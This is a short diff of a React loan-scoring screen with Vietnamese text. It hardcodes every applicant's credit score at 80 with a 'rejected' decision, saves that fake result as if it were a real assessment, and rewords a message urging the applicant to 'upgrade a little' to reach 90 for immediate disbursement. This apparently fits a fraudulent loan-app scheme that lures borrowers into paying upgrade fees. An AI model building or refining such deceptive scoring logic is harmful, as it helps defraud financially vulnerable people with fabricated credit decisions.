@@ -38,7 +38,7 @@ const ScoringView: React.FC<ScoringViewProps> = ({ user, loan, onComplete }) => 
         // Cố định kết quả cho bản Demo theo kịch bản khách hàng mong muốn
         const finalScore = 80;
         const finalDecision = 'rejected';
-        const finalReason = "Điểm tín dụng rất tốt, nhưng cần nâng cấp lên để đủ 90 tín dụng để được giải ngân lập tức.";
+        const finalReason = "Điểm tín dụng rất tốt, nhưng cần nâng cấp thêm 1 chút cho đủ 90 tín dụng để được giải ngân lập tức.";
 
         // Bước 3: Lưu vào Supabase Cloud (nếu có cấu hình)
         setProgress(70);
@@ -78,7 +78,7 @@ const ScoringView: React.FC<ScoringViewProps> = ({ user, loan, onComplete }) => 
           credit_score: 80,
           risk_level: 'medium',
           decision: 'rejected',
-          reason: "Điểm tín dụng rất tốt, nhưng cần nâng cấp lên để đủ 90 tín dụng để được giải ngân lập tức."
+          reason: "Điểm tín dụng rất tốt, nhưng cần nâng cấp thêm 1 chút cho đủ 90 tín dụng để được giải ngân lập tức."
         }));
         if (isMounted) navigate('/result');
       }
